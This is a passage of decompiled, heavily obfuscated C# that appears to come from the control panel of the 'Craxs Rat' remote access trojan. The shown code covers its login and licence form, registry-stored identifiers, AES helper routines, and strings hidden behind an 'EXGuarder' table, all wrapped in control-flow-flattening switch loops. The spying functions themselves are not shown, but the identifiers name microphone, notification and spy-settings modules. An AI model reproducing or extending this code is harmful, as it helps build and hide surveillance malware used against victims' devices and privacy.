          switch ((num3 = (uint) (-704259567 - ~((~num2 ^ -297216023 * (~(830878200 ^ -2092898833) + -1148753080) ^ 710444118 ^ -1015931504 ^ 804571502 ^ -537843302 ^ -1205289574 ^ -402528899 ^ ~1924430395) * 1424578869))) % 6U)
          {
            case 0:
              chiDbtn.Click += eventHandler;
              num1 = (int) num3 * -1584084483 ^ -1229842012;
              continue;
            case 1:
              chiDbtn.Click -= eventHandler;
              num1 = (int) num3 * -224428301 ^ 1139961880;
              continue;
            case 2:
              int num4 = chiDbtn == null ? 1796564054 : (num4 = -1651598986);
              num1 = num4 ^ (int) num3 * -1168184933;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              goto label_6;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_6:
        ((NativeMethods) this)._CHIDbtn = value;
        chiDbtn = ((NativeMethods) this)._CHIDbtn;
        num1 = -1966861272;
        goto label_2;
      }
    }

    internal virtual DrakeUITextBox CHIDpassword
    {
      get => ((NativeMethods.BLENDFUNCTION) this)._CHIDpassword;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((NativeMethods.BLENDFUNCTION) this)._CHIDpassword = value;
      }
    }

    internal virtual DrakeUITextBox CHIDaccount
    {
      get => ((NativeMethods.BLENDFUNCTION) this)._CHIDaccount;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((NativeMethods.BLENDFUNCTION) this)._CHIDaccount = value;
      }
    }

    internal virtual Label Label2
    {
      get => ((NativeMethods.BLENDFUNCTION) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((NativeMethods.BLENDFUNCTION) this)._Label2 = value;
      }
    }

    internal virtual DrakeUILoadingBar loadingimageR
    {
      get => ((NativeMethods.BLENDFUNCTION) this)._loadingimageR;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((NativeMethods.BLENDFUNCTION) this)._loadingimageR = value;
      }
    }

    internal virtual DrakeUILoadingBar CHIDimg
    {
      get => ((NativeMethods.RECT) this)._CHIDimg;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((NativeMethods.RECT) this)._CHIDimg = value;
      }
    }

    internal virtual BackgroundWorker changeIDWorker
    {
      get => ((NativeMethods.RECT) this)._changeIDWorker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        RunWorkerCompletedEventHandler completedEventHandler = new RunWorkerCompletedEventHandler(this.changeIDWorker_RunWorkerCompleted);
label_1:
        int num1 = -1581834071;
        BackgroundWorker changeIdWorker;
        DoWorkEventHandler workEventHandler;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~(num1 * -1752056089 - (~((464682585 ^ -1236782323) + (1167679820 ^ -457325907)) ^ ~104866960 - 590929860)) * -321812515 - 165218557 * 1418207597) * -1381969267)) % 11U)
          {
            case 0:
              changeIdWorker.RunWorkerCompleted += completedEventHandler;
              num1 = (int) num2 * -1993627348 ^ 516387405;
              continue;
            case 1:
              changeIdWorker = ((NativeMethods.RECT) this)._changeIDWorker;
              num1 = (int) num2 * -1435989495 ^ 1226772138;
              continue;
            case 2:
              workEventHandler = new DoWorkEventHandler(this.changeIDWorker_DoWork);
              num1 = (int) num2 * -1550745563 ^ 1144060961;
              continue;
            case 3:
              changeIdWorker = ((NativeMethods.RECT) this)._changeIDWorker;
              num1 = (int) num2 * 84412286 ^ 408740158;
              continue;
            case 4:
              ((NativeMethods.RECT) this)._changeIDWorker = value;
              num1 = 381063937;
              continue;
            case 5:
              changeIdWorker.RunWorkerCompleted -= completedEventHandler;
              changeIdWorker.DoWork -= workEventHandler;
              num1 = (int) num2 * 1777693873 ^ -116795722;
              continue;
            case 6:
              goto label_1;
            case 7:
              goto label_3;
            case 8:
              changeIdWorker.DoWork += workEventHandler;
              num1 = (int) num2 * 267347795 ^ 1186302081;
              continue;
            case 9:
              int num3 = changeIdWorker == null ? 1723463793 : (num3 = 1296383452);
              num1 = num3 ^ (int) num2 * 70903428;
              continue;
            case 10:
              int num4 = changeIdWorker == null ? -1875890717 : (num4 = -149954205);
              num1 = num4 ^ (int) num2 * 426890714;
              continue;
            default:
              goto label_13;
          }
        }
label_3:
        return;
label_13:;
      }
    }

    public Ports()
    {
label_1:
      int num1 = 365256928;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~-((1536510071 ^ -698040620) * -443920127 - -(num2 * -543271385) * -1723226077)) % 12U)
        {
          case 0:
            this.Font = Settings.f;
            num1 = (int) num3 * -129424498 ^ 429737055;
            continue;
          case 1:
            ((Notifications) this).Check_Json = EXGuarder.\u00308493B60;
            ((Notifications) this).Checkv2_Json = EXGuarder.\u0031C534969;
            ((Notifications) this).Session = EXGuarder.\u00354114345;
            num1 = (int) num3 * 944870013 ^ 101144257;
            continue;
          case 2:
            this.Load += new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatswsxcddgto);
            num1 = (int) num3 * 1315476836 ^ -1803849565;
            continue;
          case 3:
            goto label_1;
          case 4:
            ((Notifications) this).Secritkey = EXGuarder.\u0037450030E;
            ((SpySettings) this).holder = EXGuarder.\u00317257838;
            ((SpySettings) this).index = 0;
            ((SpySettings) this).Finish = false;
            num1 = (int) num3 * -29551672 ^ -460396367;
            continue;
          case 5:
            goto label_3;
          case 6:
            ((NativeMethods.RECT) this).r = (Random) null;
            num1 = (int) num3 * -2004748993 ^ -598589085;
            continue;
          case 7:
            ((NativeMethods.RECT) this).Ping_Json = EXGuarder.\u00349084A6B;
            num1 = (int) num3 * -412197127 ^ -1370758616;
            continue;
          case 8:
            ((Microphone) this).InitializeComponent();
            num1 = (int) num3 * -1554019850 ^ 1335202602;
            continue;
          case 9:
            this.FormClosing += new FormClosingEventHandler(this.Ports_FormClosing);
            num1 = (int) num3 * 37354075 ^ -678299369;
            continue;
          case 10:
            ((Notifications) this).IDC_Json = EXGuarder.\u0032F07376A;
            num1 = (int) num3 * 524403684 ^ -346145994;
            continue;
          case 11:
            ((SpySettings) this).S = false;
            num1 = (int) num3 * 1154727135 ^ -856733793;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:;
    }

    public void CraxsStyle()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = -1256575326;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(-num1 - (-612966279 * (~-2019067085 - -1983841283 * -1739726407) - ((-902196846 ^ 1268377823 ^ ~1617141874) - 1546188227)))) % 23U)
        {
          case 0:
            this.exitbtn.Text = Codes.Translate(this.exitbtn.Text, EXGuarder.\u0031B402609, EXGuarder.\u0034B5E0A04);
            num1 = (int) num2 * 1516207323 ^ -1150809419;
            continue;
          case 1:
            this.usremailtext.Watermark = EXGuarder.\u0033A4F2957;
            num1 = (int) num2 * 1389115636 ^ -642722422;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.qutelabel.Text = EXGuarder.\u0031E1F692E;
            num1 = (int) num2 * 1778920803 ^ 600756922;
            continue;
          case 4:
            this.Label1.Text = EXGuarder.\u0031016782B;
            num1 = (int) num2 * 181169030 ^ 281058948;
            continue;
          case 5:
            goto label_1;
          case 6:
            this.savekey.Text = EXGuarder.\u003285A684E;
            this.usrkeytext.Watermark = EXGuarder.\u003575D703D;
            num1 = (int) num2 * -1353670669 ^ -725431407;
            continue;
          case 7:
            this.savekey.Text = EXGuarder.\u0033A5D6019;
            num1 = (int) num2 * -404350396 ^ -2007387769;
            continue;
          case 8:
            int num3 = Operators.CompareString(language, EXGuarder.\u003032E3849, false) == 0 ? 812450435 : (num3 = 853766745);
            num1 = num3 ^ (int) num2 * -505226373;
            continue;
          case 9:
            num1 = (int) num2 * -343182332 ^ 1304100106;
            continue;
          case 10:
            this.DrakeUITabControl1.TabPages[1].Text = EXGuarder.\u00347284111;
            num1 = (int) num2 * -1055067854 ^ 1809904553;
            continue;
          case 11:
            this.Label2.Text = EXGuarder.\u0032632744B;
            num1 = (int) num2 * -289839396 ^ -301675940;
            continue;
          case 12:
            this.welclabel.Text = EXGuarder.\u0036E554E37;
            num1 = (int) num2 * -1707801324 ^ 1587522421;
            continue;
          case 13:
            this.qutelabel.Text = EXGuarder.\u0036B11225B;
            num1 = (int) num2 * 1655025323 ^ -1103864287;
            continue;
          case 14:
            this.exitbtn.Text = Codes.Translate(this.exitbtn.Text, EXGuarder.\u0031B402609, EXGuarder.\u0031C1D443C);
            num1 = (int) num2 * 1613354749 ^ 1509519609;
            continue;
          case 15:
            this.policylink.Text = EXGuarder.\u00312765646;
            num1 = (int) num2 * -334964380 ^ -624219446;
            continue;
          case 16:
            this.usrkeytext.Watermark = EXGuarder.\u0031E026E3F;
            num1 = (int) num2 * -1133185934 ^ -1642301254;
            continue;
          case 17:
            this.welclabel.Text = EXGuarder.\u0035B256519;
            num1 = (int) num2 * 1293090747 ^ -1384973285;
            continue;
          case 18:
            this.usremailtext.Watermark = EXGuarder.\u00357397453;
            num1 = (int) num2 * -2132993650 ^ -1020240264;
            continue;
          case 19:
            this.policylink.Text = EXGuarder.\u003125E186B;
            num1 = -1298357174;
            continue;
          case 20:
            this.DrakeUITabControl1.TabPages[2].Text = EXGuarder.\u0032105186A;
            this.loginlabel.Text = EXGuarder.\u00346480034;
            num1 = (int) num2 * -2123507153 ^ -430078772;
            continue;
          case 21:
            this.DrakeUITabControl1.TabPages[0].Text = EXGuarder.\u0036838632C;
            num1 = (int) num2 * -96145710 ^ 489345409;
            continue;
          case 22:
            int num4 = Operators.CompareString(language, EXGuarder.\u0031C414554, false) != 0 ? 504517906 : (num4 = 881416979);
            num1 = num4 ^ (int) num2 * 1435551840;
            continue;
          default:
            goto label_25;
        }
      }
label_3:
      return;
label_25:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatswsxcddgto(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.Icon = Craxs_Rat.My.Resources.Resources.max;
label_1:
      int num1 = -1668035617;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((--num1 - ~-(-1373695780 * 152619165)) * -746608941 * 1657088185 + 1222295529)) % 3U)
        {
          case 1:
            if (RegistryHandler.Get_ID_ASSIST() == null)
            {
              num1 = (int) num2 * 1788688417 ^ 1027379466;
              continue;
            }
            goto label_6;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      RegistryHandler.Set_ID_ASSIST(SecurityKey.GenRandom(15));
label_6:
      try
      {
        if (!MyComputer.get_Computer().Info.OSFullName.Contains(EXGuarder.\u00375632036))
        {
label_7:
          int num3 = -503849787;
          while (true)
          {
            uint num4;
            switch ((num4 = (uint) ((--num3 - ~-(-1373695780 * 152619165)) * -746608941 * 1657088185 + 1222295529)) % 5U)
            {
              case 0:
                RegistryHandler.setworning(EXGuarder.\u0031E2B1639);
                num3 = (int) num4 * 1949681275 ^ -1236102507;
                continue;
              case 2:
                // ISSUE: object of a compiler-generated type is created
                int num5 = (int) ((Form) new alertform.VB\u0024StateMachine_39_FadeIn()).ShowDialog();
                num3 = (int) num4 * 565002783 ^ 519560609;
                continue;
              case 3:
                goto label_7;
              case 4:
                int num6 = RegistryHandler.getworning() != null ? -658062342 : (num6 = 1785869106);
                num3 = num6 ^ (int) num4 * -797288345;
                continue;
              default:
                goto label_17;
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_13:
        int num7 = -1551013613;
        while (true)
        {
          uint num8;
          switch ((num8 = (uint) ((--num7 - ~-(-1373695780 * 152619165)) * -746608941 * 1657088185 + 1222295529)) % 3U)
          {
            case 1:
              ProjectData.ClearProjectError();
              num7 = (int) num8 * -1735391572 ^ -1998290885;
              continue;
            case 2:
              goto label_13;
            default:
              goto label_17;
          }
        }
      }
label_17:
      this.CraxsStyle();
      this.usrkeytext.Text = Codes.getuserkey();
      this.usremailtext.Text = RegistryHandler.Get_EMAIL();
label_18:
      int num9 = -2055579705;
      while (true)
      {
        uint num10;
        switch ((num10 = (uint) ((--num9 - ~-(-1373695780 * 152619165)) * -746608941 * 1657088185 + 1222295529)) % 4U)
        {
          case 0:
            goto label_18;
          case 1:
            this.loginbtn.Focus();
            num9 = (int) num10 * -149141584 ^ 1538659946;
            continue;
          case 2:
            this.statuslabel.Text = EXGuarder.\u003201A5A3C;
            this.FadeIn((Form) this, 40);
            DrakeUITabControl drakeUiTabControl1 = this.DrakeUITabControl1;
            Size size1 = this.DrakeUITabControl1.Size;
            int width = checked ((int) Conversion.Int(unchecked ((double) size1.Width / 3.0 - 5.0)));
            size1 = this.DrakeUITabControl1.ItemSize;
            int height = size1.Height;
            Size size2 = new Size(width, height);
            drakeUiTabControl1.ItemSize = size2;
            num9 = (int) num10 * -1493835133 ^ -1723865513;
            continue;
          case 3:
            goto label_20;
          default:
            goto label_16;
        }
      }
label_20:
      return;
label_16:;
    }

    private void FadeIn(Form o, int interval = 80)
    {
      // ISSUE: variable of a compiler-generated type
      Ports.VB\u0024StateMachine_174_FadeIn machine174FadeIn = (Ports.VB\u0024StateMachine_174_FadeIn) new Ports.opebbtndele();
      ((SpySettings) machine174FadeIn).\u0024VB\u0024Me = this;
label_1:
      int num1 = -145043037;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~~-(1165798473 ^ -182490041) - ~num2 ^ 431470840)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            ((SpySettings) machine174FadeIn).\u0024VB\u0024Local_o = o;
            ((SpySettings) machine174FadeIn).\u0024VB\u0024Local_interval = interval;
            num1 = (int) num3 * 84759906 ^ -1106804084;
            continue;
          case 3:
            ((SpySettings) machine174FadeIn).\u0024State = -1;
            ((SpySettings) machine174FadeIn).\u0024Builder = AsyncVoidMethodBuilder.Create();
            num1 = (int) num3 * -257663904 ^ -485106538;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      ((SpySettings) machine174FadeIn).\u0024Builder.Start<Ports.VB\u0024StateMachine_174_FadeIn>(ref machine174FadeIn);
    }

    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetCurrentThread();

    public void Done(object[] objs)
    {
      if (!this.statuslabel.InvokeRequired)
        goto label_7;
label_1:
      int num1 = -1400365767;
label_2:
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(-(~(num1 - 1309191255 * -(-1446661613 * (206206257 * 2071211039) - (42211292 - 638660851 + (1225526569 ^ 1625965644)))) - (436933353 * 240687305 - (1490188304 ^ -1407933481) - ~(662815046 + 1018875960))) * -1950124939)) % 9U)
        {
          case 0:
            this.statuslabel.Text = str;
            num1 = 1503656814;
            continue;
          case 1:
            CraxsAlert.ShowWarning(str.Replace(EXGuarder.\u00352470F3A, EXGuarder.\u00361595557));
            num1 = (int) num2 * 527134122 ^ 369402246;
            continue;
          case 2:
            int num3 = !str.StartsWith(EXGuarder.\u00352470F3A) ? 1943085662 : (num3 = -748837048);
            num1 = num3 ^ (int) num2 * -88035060;
            continue;
          case 3:
            goto label_3;
          case 4:
            // ISSUE: method pointer
            this.statuslabel.Invoke((Delegate) new Ports((object) this, __methodptr(Done)), (object) objs);
            num1 = (int) num2 * 1051223723 ^ -1531886147;
            continue;
          case 5:
            num1 = (int) num2 * -995028619 ^ -832790886;
            continue;
          case 6:
            num1 = (int) num2 * 987208482 ^ 914624490;
            continue;
          case 7:
            goto label_1;
          case 8:
            goto label_7;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:
      return;
label_7:
      str = Conversions.ToString(objs[0]);
      num1 = 572100998;
      goto label_2;
    }

    public void opebbtn(object[] objs)
    {
      if (!this.loginbtn.InvokeRequired)
        goto label_17;
label_1:
      int num1 = 2057877940;
label_2:
      string language1;
      Ports.opebbtndele method1;
      string language2;
      string language3;
      Ports.opebbtndele method2;
      Ports.opebbtndele method3;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~~(num1 ^ (-(-878284915 - 506626372) * 1979636671 ^ -344372445) - (-~(-3227319 ^ 1070901223) + (--2114923539 + --901505805 - -9424830))) - -1376116304 - 1701002850)) % 36U)
        {
          case 0:
            goto label_17;
          case 1:
            method1 = (Ports.opebbtndele) new Ports.addLogback(this.opebbtn);
            num1 = (int) num2 * 1305990423 ^ -2128721640;
            continue;
          case 2:
            int num3 = Operators.CompareString(language1, EXGuarder.\u0031D453369, false) == 0 ? -488503961 : (num3 = -1872525602);
            num1 = num3 ^ (int) num2 * 1700491242;
            continue;
          case 3:
            this.CHIDbtn.Invoke((Delegate) method2, (object) objs);
            num1 = (int) num2 * -943587350 ^ -160539129;
            continue;
          case 4:
            method2 = (Ports.opebbtndele) new Ports.addLogback(this.opebbtn);
            num1 = (int) num2 * 446035035 ^ 1329934742;
            continue;
          case 5:
            method3 = (Ports.opebbtndele) new Ports.addLogback(this.opebbtn);
            num1 = (int) num2 * 1934027205 ^ 1397069660;
            continue;
          case 6:
            goto label_3;
          case 7:
            num1 = (int) num2 * -1711990984 ^ 1815694089;
            continue;
          case 8:
            this.loginbtn.Invoke((Delegate) method1, (object) objs);
            num1 = (int) num2 * -980291970 ^ -2038521146;
            continue;
          case 9:
            language2 = RegistryHandler.Get_Language();
            num1 = 1670636873;
            continue;
          case 10:
            num1 = (int) num2 * 1572314853 ^ 1615578099;
            continue;
          case 11:
            int num4;
            num1 = num4 = !this.regbtn.InvokeRequired ? -1605338774 : (num4 = 95908536);
            continue;
          case 12:
            this.regbtn.Text = EXGuarder.\u003386E336F;
            num1 = 174777945;
            continue;
          case 13:
            this.regbtn.Text = Codes.AES_Decrypt(EXGuarder.\u0032E170521, EXGuarder.\u0032F3F7316);
            num1 = (int) num2 * 1651052103 ^ 1330350686;
            continue;
          case 14:
            this.loginbtn.Text = EXGuarder.\u003552E1526;
            num1 = 1165914618;
            continue;
          case 15:
            int num5 = Operators.CompareString(language3, EXGuarder.\u00329140938, false) == 0 ? -1807116636 : (num5 = -1636323545);
            num1 = num5 ^ (int) num2 * 191848053;
            continue;
          case 16:
            int num6 = Operators.CompareString(language1, EXGuarder.\u00329140938, false) == 0 ? 219976501 : (num6 = 626557925);
            num1 = num6 ^ (int) num2 * -45663805;
            continue;
          case 17:
            int num7 = Operators.CompareString(language3, EXGuarder.\u0031D453369, false) == 0 ? 1070869274 : (num7 = 1514374282);
            num1 = num7 ^ (int) num2 * 2139973070;
            continue;
          case 18:
            this.regbtn.Invoke((Delegate) method3, (object) objs);
            num1 = (int) num2 * 1693850712 ^ -631118548;
            continue;
          case 19:
            num1 = (int) num2 * 751040664 ^ 908491529;
            continue;
          case 20:
            this.CHIDbtn.Text = Codes.AES_Decrypt(EXGuarder.\u00348414A07, EXGuarder.\u0032F3F7316);
            num1 = (int) num2 * -1963923882 ^ -379392262;
            continue;
          case 21:
            this.regbtn.Text = EXGuarder.\u0032C2A595C;
            num1 = 174777945;
            continue;
          case 22:
            num1 = (int) num2 * -1928315737 ^ -695681197;
            continue;
          case 23:
            this.loginbtn.Text = Codes.AES_Decrypt(EXGuarder.\u00369195A32, EXGuarder.\u0032F3F7316);
            num1 = (int) num2 * 1744888907 ^ 605723657;
            continue;
          case 24:
            num1 = (int) num2 * 1023753358 ^ -937880607;
            continue;
          case 25:
            num1 = (int) num2 * -1573140224 ^ 1171482874;
            continue;
          case 26:
            this.CHIDbtn.Text = EXGuarder.\u0032D59714C;
            num1 = -1497236575;
            continue;
          case 27:
            this.CHIDbtn.Text = EXGuarder.\u0035367433F;
            num1 = 1112084243;
            continue;
          case 28:
            this.loginbtn.Text = EXGuarder.\u0036C5E7123;
            num1 = -1556153600;
            continue;
          case 29:
            num1 = (int) num2 * -1751202846 ^ -712783488;
            continue;
          case 30:
            int num8;
            num1 = num8 = !this.CHIDbtn.InvokeRequired ? 1406859260 : (num8 = 1667481347);
            continue;
          case 31:
            language3 = RegistryHandler.Get_Language();
            num1 = 470510106;
            continue;
          case 32:
            goto label_1;
          case 33:
            num1 = (int) num2 * -1758397852 ^ -716056779;
            continue;
          case 34:
            int num9 = Operators.CompareString(language2, EXGuarder.\u00329140938, false) == 0 ? 1693686771 : (num9 = 1123080588);
            num1 = num9 ^ (int) num2 * 439752673;
            continue;
          case 35:
            int num10 = Operators.CompareString(language2, EXGuarder.\u0031D453369, false) == 0 ? -1374644910 : (num10 = -1429537089);
            num1 = num10 ^ (int) num2 * 177019676;
            continue;
          default:
            goto label_38;
        }
      }
label_3:
      return;
label_38:
      return;
label_17:
      language1 = RegistryHandler.Get_Language();
      num1 = 381632491;
      goto label_2;
    }

    public object RandomString()
    {
      if (((NativeMethods.RECT) this).r != null)
        goto label_11;
label_1:
      int num1 = -723652900;
label_2:
      StringBuilder stringBuilder;
      string str;
      int startIndex;
      int num2;
      object obj;
      int num3;
      while (true)
      {
        uint num4;
        switch ((num4 = (uint) (-(((num1 * -1970878769 ^ -47982807 * ((-596964678 ^ -1778052583) - 171869157) + ((-1603823282 ^ 1485064327) * -1585016595 - ((-1654580047 ^ -2037504772) - -1707361927 * 1928837036))) - (--321817333 - ~-1735419119 + ~(260069813 ^ -1410197698))) * 1393286165) * -1552626463)) % 11U)
        {
          case 0:
            goto label_1;
          case 1:
            stringBuilder.Append(str.Substring(startIndex, 1));
            num1 = (int) num4 * -1558977455 ^ -1303713544;
            continue;
          case 2:
            int num5;
            num1 = num5 = num2 <= num3 ? -1576558025 : (num5 = 1590922270);
            continue;
          case 4:
            num3 = 32;
            num1 = (int) num4 * -337413240 ^ 1038559587;
            continue;
          case 5:
            startIndex = ((NativeMethods.RECT) this).r.Next(0, str.Length);
            num1 = 1678018527;
            continue;
          case 6:
            checked { ++num2; }
            num1 = (int) num4 * 1182605970 ^ 191750188;
            continue;
          case 7:
            num2 = 1;
            num1 = (int) num4 * 1528642072 ^ -1951271546;
            continue;
          case 8:
            ((NativeMethods.RECT) this).r = new Random();
            num1 = (int) num4 * 758166620 ^ -544290650;
            continue;
          case 9:
            goto label_11;
          case 10:
            obj = (object) stringBuilder.ToString();
            num1 = (int) num4 * 151270362 ^ 1051148499;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return obj;
label_11:
      str = EXGuarder.\u0035B706445;
      stringBuilder = new StringBuilder();
      num1 = 222403456;
      goto label_2;
    }

    public string DecryptRJ256(string prm_key, string prm_iv, string prm_text_to_decrypt)
    {
      string s = prm_text_to_decrypt;
label_1:
      int num1 = 157728604;
      byte[] bytes1;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-1928156459 - -1267584181 - (~(1619215165 * (--~1713988443 + (507135310 * 1783711301 - (1769597211 - -1378941344) ^ ~(-1226042891 ^ -1625875913))) - num2) * 2025488823 ^ -1929076583) + 2003080698)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            bytes1 = Encoding.ASCII.GetBytes(prm_key);
            num1 = (int) num3 * 331829286 ^ -1094625020;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      byte[] bytes2 = Encoding.ASCII.GetBytes(prm_iv);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] numArray;
      try
      {
        rijndaelManaged.Padding = PaddingMode.PKCS7;
        rijndaelManaged.Mode = CipherMode.CBC;
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(bytes1, bytes2);
        byte[] buffer = Convert.FromBase64String(s);
label_6:
        int num4 = -1823147028;
        CryptoStream cryptoStream;
        while (true)
        {
          int num5 = num4;
          uint num6;
          MemoryStream memoryStream;
          switch ((num6 = (uint) (-1928156459 - -1267584181 - (~(1619215165 * (--~1713988443 + (507135310 * 1783711301 - (1769597211 - -1378941344) ^ ~(-1226042891 ^ -1625875913))) - num5) * 2025488823 ^ -1929076583) + 2003080698)) % 5U)
          {
            case 0:
              goto label_6;
            case 1:
              cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
              num4 = (int) num6 * 1831335805 ^ 1407375972;
              continue;
            case 2:
              numArray = new byte[checked (buffer.Length - 1 + 1)];
              num4 = (int) num6 * 1905936016 ^ -1205611260;
              continue;
            case 3:
              memoryStream = new MemoryStream(buffer);
              num4 = (int) num6 * -436813394 ^ -1142772217;
              continue;
            default:
              goto label_11;
          }
        }
label_11:
        cryptoStream.Read(numArray, 0, numArray.Length);
      }
      finally
      {
        if (rijndaelManaged != null)
        {
label_13:
          int num7 = -1969026807;
          while (true)
          {
            int num8 = num7;
            uint num9;
            switch ((num9 = (uint) (-1928156459 - -1267584181 - (~(1619215165 * (--~1713988443 + (507135310 * 1783711301 - (1769597211 - -1378941344) ^ ~(-1226042891 ^ -1625875913))) - num8) * 2025488823 ^ -1929076583) + 2003080698)) % 3U)
            {
              case 1:
                ((IDisposable) rijndaelManaged).Dispose();
                num7 = (int) num9 * 373678995 ^ -97153836;
                continue;
              case 2:
                goto label_13;
              default:
                goto label_16;
            }
          }
        }
label_16:;
      }
      return Encoding.ASCII.GetString(numArray);
    }

    public string EncryptRJ256(string prm_key, string prm_iv, string prm_text_to_encrypt)
    {
      string s = prm_text_to_encrypt;
label_1:
      int num1 = 1129474988;
      byte[] bytes1;
      byte[] bytes2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (--~(num1 + ~(539391373 * -893418776 + 1974298884 + ---1308296156) ^ -(~(-1924023266 - -1739831577) - (-119944448 - 91491754 + (508008108 + 1379254010)))) ^ -351309427)) % 3U)
        {
          case 1:
            bytes1 = Encoding.ASCII.GetBytes(prm_key);
            bytes2 = Encoding.ASCII.GetBytes(prm_iv);
            num1 = (int) num2 * -1103934445 ^ -241746667;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] array;
      try
      {
        rijndaelManaged.Padding = PaddingMode.PKCS7;
        rijndaelManaged.Mode = CipherMode.CBC;
label_6:
        int num3 = -278891333;
        ICryptoTransform encryptor;
        byte[] bytes3;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (--~(num3 + ~(539391373 * -893418776 + 1974298884 + ---1308296156) ^ -(~(-1924023266 - -1739831577) - (-119944448 - 91491754 + (508008108 + 1379254010)))) ^ -351309427)) % 6U)
          {
            case 0:
              goto label_6;
            case 1:
              encryptor = rijndaelManaged.CreateEncryptor(bytes1, bytes2);
              bytes3 = Encoding.ASCII.GetBytes(s);
              num3 = (int) num4 * 1817144767 ^ -2143713781;
              continue;
            case 2:
              rijndaelManaged.BlockSize = 128;
              num3 = (int) num4 * 1378014152 ^ -1245638768;
              continue;
            case 3:
              MemoryStream memoryStream = new MemoryStream();
              CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, encryptor, CryptoStreamMode.Write);
              cryptoStream.Write(bytes3, 0, bytes3.Length);
              cryptoStream.FlushFinalBlock();
              array = memoryStream.ToArray();
              num3 = (int) num4 * 617414033 ^ -1745313215;
              continue;
            case 4:
              rijndaelManaged.KeySize = 256;
              num3 = (int) num4 * -1077757480 ^ 1847662677;
              continue;
            default:
              goto label_17;
          }
        }
      }
      finally
      {
        if (rijndaelManaged != null)
        {
label_13:
          int num5 = 892368481;
          while (true)
          {
            uint num6;
            switch ((num6 = (uint) (--~(num5 + ~(539391373 * -893418776 + 1974298884 + ---1308296156) ^ -(~(-1924023266 - -1739831577) - (-119944448 - 91491754 + (508008108 + 1379254010)))) ^ -351309427)) % 3U)
            {
              case 0:
                goto label_13;
              case 2:
                ((IDisposable) rijndaelManaged).Dispose();
                num5 = (int) num6 * 1031339774 ^ 78172991;
                continue;
              default:
                goto label_16;
            }
          }
        }
label_16:;
      }
label_17:
      return Convert.ToBase64String(array);
    }

    public string KeepOnlyEnglishLetters(string input)
    {
      string pattern = EXGuarder.\u0031E35226D;
label_1:
      int num1 = -1592844543;
      string str1;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string str2;
        switch ((num3 = (uint) (-~(--~(-943148230 ^ 2129898359) - num2 * 1421419927 - -458906158) ^ 1262009844)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str1 = str2;
            num1 = (int) num3 * 1070847651 ^ 943556897;
            continue;
          case 2:
            str2 = Regex.Replace(input, pattern, EXGuarder.\u003011E0818);
            num1 = (int) num3 * -973369817 ^ 684091762;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str1;
    }

    private void pnl1_Paint(object sender, PaintEventArgs e)
    {
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      this.DialogResult = DialogResult.No;
      this.Close();
    }

    private void Addpo_Click(object sender, EventArgs e)
    {
    }

    private void Rempo_Click(object sender, EventArgs e)
    {
    }

    private void DrakeUILinkLabel1_Click(object sender, EventArgs e)
    {
      int num = (int) MyProject.Forms.Dialog2.ShowDialog();
    }

    private void Button1_Click(object sender, EventArgs e)
    {
    }

    private void Pnl1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 27773938;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-num1 + (---2087292133 + (-1196050333 - 879882296 + (605192388 - -505242057)) ^ -(495774443 - 1626114739) * 1233393145)) * -1761356771 * 1573818465)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            Codes.ReleaseCapture();
            num1 = (int) num2 * 1747129147 ^ -1261937773;
            continue;
          case 2:
            goto label_6;
          case 3:
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * -1241477282 ^ 916877831;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void PictureBox3_Click(object sender, EventArgs e)
    {
    }

    private void PictureBox3_Click_1(object sender, EventArgs e)
    {
      try
      {
